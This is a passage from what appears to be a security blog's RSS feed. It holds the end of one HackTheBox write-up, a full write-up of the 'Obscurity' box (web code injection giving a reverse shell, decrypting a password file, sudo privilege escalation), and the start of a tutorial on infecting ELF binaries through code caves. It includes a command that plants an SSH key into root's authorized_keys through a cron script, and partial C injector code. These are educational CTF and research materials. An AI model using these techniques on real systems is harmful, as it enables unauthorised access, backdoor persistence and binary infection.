&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;zip -r website.bak.zip /var/www/html &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; mv website.bak.zip /root/backup.zip
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, we could just import our public SSH key and have root access.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;echo SSH_PUB_KEY &amp;gt;&amp;gt; /root/.ssh/authorized_keys&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /usr/bin/timer_backup.sh
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;I&amp;rsquo;ve seen that a lot of people said that this box is easy, which I can agree in the way that you can find the CVE quite easy and modify the POC payload to get the flags and move on, without diving more into it. However, I think that this is a great box for someone new and even for some more experienced people. I say this because if you really want to understand what&amp;rsquo;s going on behind the scenes, which you should, you understand new concepts such as: &lt;em&gt;java deserialization, gadgets, how an actual CVE is found, etc&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Honestly, I learned a lot by playing around with this box and afterall this is the goal of &lt;em&gt;HTB&lt;/em&gt;. To learn new concepts that you can add to your skill-set which elevates your craft.&lt;/p&gt;
&lt;p&gt;If you want to dig deeper into deserealization attacks within java libraries, I suggest you check the references down below. I found some really great articles/talks about this subject which I can&amp;rsquo;t give enough credit.&lt;/p&gt;
&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://medium.com/@swapneildash/understanding-java-de-serialization-ee96054da15d&#34;&gt;Understanding Java Deserialization&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/ikkisoft/SerialKiller&#34;&gt;Java deserealization lib to secure apps&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://medium.com/@swapneildash/understanding-insecure-implementation-of-jackson-deserialization-7b3d409d2038&#34;&gt;Understanding insecure implementation of Jackson deserialization&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062#da96&#34;&gt;On Jackson CVEs: Don’t Panic — Here is what you need to know&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858&#34;&gt;SnakeYaml Deserilization exploited&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/frohoff/ysoserial&#34;&gt;POC tool 4 generating payloads that exploit unsage Java object deserilization&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://brandur.org/fragments/gadgets-and-chains&#34;&gt;Depickling, gadgets and chains: The class of exploit that unraveled Equifax&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/galimba/Jackson-deserialization-PoC&#34;&gt;POC Jackson deserilization on Spring web app&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jackson-json&#34;&gt;Java deserilization cheat-sheet&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/FasterXML/jackson&#34;&gt;Jackson Library&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=KSA7vUkXGSg&#34;&gt;Marshalling Pickles - OWASP AppSec California 2015&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.doyensec.com/2019/07/22/jackson-gadgets.html&#34;&gt;CVE-2019-12384&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
    <item>
      <title>Obscurity Hackthebox</title>
      <link>https://vlagh3.github.io/writeups/htb/obscurity/</link>
      <pubDate>Wed, 10 Mar 2021 12:48:05 +0300</pubDate>
      
      <guid>https://vlagh3.github.io/writeups/htb/obscurity/</guid>
      <description>Enumeration I started with a simple nmap to get a basic overview:
nmap -sC -sV -oA nmap/obscurity 10.10.10.168 As you can see ports 8080 (http), 22(ssh) and 9000 are open.
Website Once on the web page we are prompted with this:
If you scroll a little bit more we find something peculiar:
So we need to find the SuperSecureServer.py file in order to get the backend code of this web app.</description>
      <content>&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/OcukgEq.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;p&gt;I started with a simple nmap to get a basic overview:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap -sC -sV -oA nmap/obscurity 10.10.10.168
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/UtwqgOP.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;As you can see ports &lt;code&gt;8080&lt;/code&gt; (&lt;strong&gt;http&lt;/strong&gt;), &lt;code&gt;22&lt;/code&gt;(&lt;strong&gt;ssh&lt;/strong&gt;) and &lt;code&gt;9000&lt;/code&gt; are open.&lt;/p&gt;
&lt;h1 id=&#34;website&#34;&gt;Website&lt;/h1&gt;
&lt;p&gt;Once on the web page we are prompted with this:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/DyVcVsf.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;If you scroll a little bit more we find something peculiar:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/nx5y6OA.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;So we need to find the &lt;code&gt;SuperSecureServer.py&lt;/code&gt; file in order to get the backend code of this web app. For that I used &lt;a href=&#34;https://github.com/ffuf/ffuf&#34;&gt;ffuf&lt;/a&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/SZfkC5u.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;After letting &lt;code&gt;ffuf&lt;/code&gt; to do it&amp;rsquo;s job for a while, we are prompted with the desired folder: &lt;code&gt;develop&lt;/code&gt;. So, the directory was not so secret afterall because we can access the file at &lt;code&gt;/develop/SuperSecureServer.py&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/2PDFkRP.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Well, now it&amp;rsquo;s time to look for a &lt;strong&gt;RCE&lt;/strong&gt; or something that we can exploit. This task is not so complicated since the following line looks like this:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/vhBYHsX.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;So we can execute code if we format correctly the &lt;code&gt;path&lt;/code&gt; variable. Therefore, I came up with this little python script:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Mxg9BRw.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;When the server processes this, the &lt;code&gt;info&lt;/code&gt; variable will look like this:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;output = &amp;lsquo;Document&amp;rsquo;
&amp;lt;reverse_shell&amp;gt;
ape=&#39;&#39;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This is valid python code. As a result, we get back a shell:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/QootNLC.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;user&#34;&gt;User&lt;/h1&gt;
&lt;p&gt;If we take a look at the folder where the user flag is we find these interesting files:
&lt;img src=&#34;https://i.imgur.com/ECmODcN.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;We have just 4 files we care about:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;SuperSecureCrypt.py&lt;/code&gt; - Python script to encrypt files&lt;/li&gt;
&lt;li&gt;&lt;code&gt;check.txt&lt;/code&gt; - Clear text of &lt;code&gt;out.txt&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;out.txt&lt;/code&gt; - Ciphertext of clear text &lt;code&gt;check.txt&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;passwordreminder.txt&lt;/code&gt; - Encrypted password of the robert user&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;By taking a look at how the encryption/decryption algorithm works, we find a funny thing. That is, we can obtain the password used in an encrypted text if we know the clear text:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/M03zheF.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Thus, in order to find the password used to encrypt the &lt;code&gt;out.txt&lt;/code&gt; file we just need to execute the following:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/rajzLAI.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;The password used to encrypt the text was: &lt;strong&gt;alexandrovich&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Now that we know the password, we can decrypt the &lt;code&gt;passwordreminder.txt&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 SuperSecretCrypt.py -k &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;alexandrovich&amp;#34;&lt;/span&gt; -i passwordreminder.txt -o /tmp/pass -d
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The password for robert being &lt;strong&gt;SecThruObsFTW&lt;/strong&gt;. Login with &lt;em&gt;SSH&lt;/em&gt; and cat &lt;code&gt;user.txt&lt;/code&gt;
&lt;img src=&#34;https://i.imgur.com/hvTjk0v.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;root&#34;&gt;Root&lt;/h1&gt;
&lt;p&gt;Now that we have access to the robert user, we can look at a file we ommited on our journey of getting the user flag. That file is &lt;code&gt;BetterSSH.py&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/wsIffJq.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;The first part of the script is just authenticating the user we provide with the password. What is more interesting is the second part:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/DmMQfyp.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;The 4th line is of interest because it executes commands with &lt;code&gt;sudo -u&lt;/code&gt; and our input, so we can do something like: &lt;code&gt;sudo -u robert -u root whoami&lt;/code&gt;, which in theory should display &lt;strong&gt;root&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;First I tried to execute the script with sudo:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Grny92t.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Ok.. so we are not allowed to run the script. At this point I decided to run &lt;a href=&#34;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS&#34;&gt;linpeas&lt;/a&gt;, which gave me this:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/rHySzW3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now it all makes sense we need to execute:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And then input &lt;code&gt;-u root cat /root/root.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/kizLVnn.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Injecting ELF files</title>
      <link>https://vlagh3.github.io/posts/elf_inject/</link>
      <pubDate>Sat, 25 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>https://vlagh3.github.io/posts/elf_inject/</guid>
      <description>Today we will continue talking about ELF files by starting to play with the headers so I’ll show you how to inject an ELF binary. This may help you get more familiar with ELF binaries and also show you the real power of it. Ok, so with all of that being said let’s dive into it. Infection Technique
This technique it’s a relative simple one but perfect for our purpose. It consists of the following steps:</description>
      <content>&lt;p&gt;Today we will continue talking about ELF files by starting to play with the headers so I’ll show you how to inject an ELF binary. This may help you get more familiar with ELF binaries and also show you the real power of it.
Ok, so with all of that being said let’s dive into it.
Infection Technique&lt;/p&gt;
&lt;p&gt;This technique it’s a relative simple one but perfect for our purpose. It consists of the following steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Find the padding area between &lt;code&gt;.text&lt;/code&gt; section and the next segment in the program.&lt;/li&gt;
&lt;li&gt;Append the payload at the end of the &lt;code&gt;.text&lt;/code&gt; section &lt;em&gt;(in that padding area)&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;Patch the ELF header to run the injected code at startup, this is done by modifying the entry point.&lt;/li&gt;
&lt;li&gt;Patch the payload, so it can resume the normal execution of the program &lt;em&gt;(original entry point)&lt;/em&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;We are going to take advantage of the padding area &lt;em&gt;(that is almost always there)&lt;/em&gt; between segments. This basically happens because the operating system works with Page granularity and because of the way the segments are loaded into memory.&lt;/p&gt;
&lt;p&gt;Anyway, in general it’s an unused area at the end of the .text section. The size of the padding depends on the size of the code, so it may vary from program to program. For that reason, some programs may not be able to be injected. &lt;em&gt;(I will let you guys find another creative ways to make it more efficient and reliable. 🙂 )&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;writing-the-injector&#34;&gt;Writing the injector&lt;/h2&gt;
&lt;p&gt;I will not show the whole code. Instead, I will divide it in some of the most important functional blocks, so it will be easier to follow.
You can find the whole source code and some of the newest implementations &lt;a href=&#34;https://github.com/vlagh3/elij&#34;&gt;on github&lt;/a&gt;.
Opening and mapping the target file &amp;amp; the payload&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;argv[]) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;…&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(argc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Usage: %s &amp;lt;file to inject&amp;gt; &amp;lt;payload&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	target_fd    &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open_and_map(argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;tsize, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;data );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	payload_fd   &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open_and_map(argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;psize, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;data1);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;…&lt;/span&gt;..
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This code is pretty straightforward. We have a small check on the arguments we pass. After we pass (to the &lt;code&gt;open_and_map&lt;/code&gt; function) 2 variables that will store the file size and a pointer to the beginning of our file. Then, we get the file desciptors for both the payload and target file.&lt;/p&gt;
&lt;p&gt;Let’s take a look at the &lt;code&gt;open_and_map&lt;/code&gt; function.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;open_and_map&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;filename, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;fsize, &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;data) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; fd;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;fsize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; get_size(filename);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( (fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(filename, O_RDWR, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		perror(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Failed to open &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;…&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This function takes 3 arguments, as said earlier. First, we store the filesize with the helper function &lt;code&gt;get_size&lt;/code&gt; &lt;em&gt;(I’m not including it here, because it’s basically just calling stat on the filename and returning its size)&lt;/em&gt;. After, we open the file with read and write permissions and then the good old error checking.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mmap(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;fsize, PROT_READ &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; PROT_WRITE &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; PROT_EXEC,   MAP_SHARED, fd, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; MAP_FAILED )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   	{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		perror(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Failed to mmap&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		close(fd);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] File %s mapped and oppened (%d bytes) at %p&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, filename, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;fsize, data);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; fd;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The second part of the function just maps the file into memory &lt;em&gt;(so we can make changes to the file without dealing with fread, lseek and all of that stuff; instead we use pointers. This way, we are now having a very convenient way to patch a file)&lt;/em&gt; and returns the file descriptor. Because of the two output parameters now we also have a pointer to the start of the file and it’s size.&lt;/p&gt;
&lt;p&gt;Now that we have access to our file we can store some information.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;elf_header &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (Elf64_Ehdr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) data;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;e_point	   &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf_header&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;e_entry;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Entry point of %s: 0x%x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)e_point)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can retrieve this kind of data because the pointer returned by &lt;code&gt;open_and_map&lt;/code&gt; function points to the actual content of the file. Thus we find the ELF header as the first thing in the file. The entry point is contained in the ELF header along with other useful information, so we just reference that information with the pointer that we’ve got to the ELF header. If you are  still confused about this, take a look at the &lt;a href=&#34;http://localhost:1313/posts/elf_struct/&#34;&gt;Exploring the ELF file structure article&lt;/a&gt; that I made and then look at the specs to understand what kind of information is kept by this structure.&lt;/p&gt;
&lt;h3 id=&#34;finding-the-padding-between-the-two-load-segments&#34;&gt;Finding the padding between the two &lt;code&gt;LOAD&lt;/code&gt; segments.&lt;/h3&gt;
&lt;p&gt;Now we need to find the padding I was talking about in the beginning of this article. Some may reffer to it as a codecave.
Anyway, I wrote a function that it’s called from main.&lt;/p&gt;
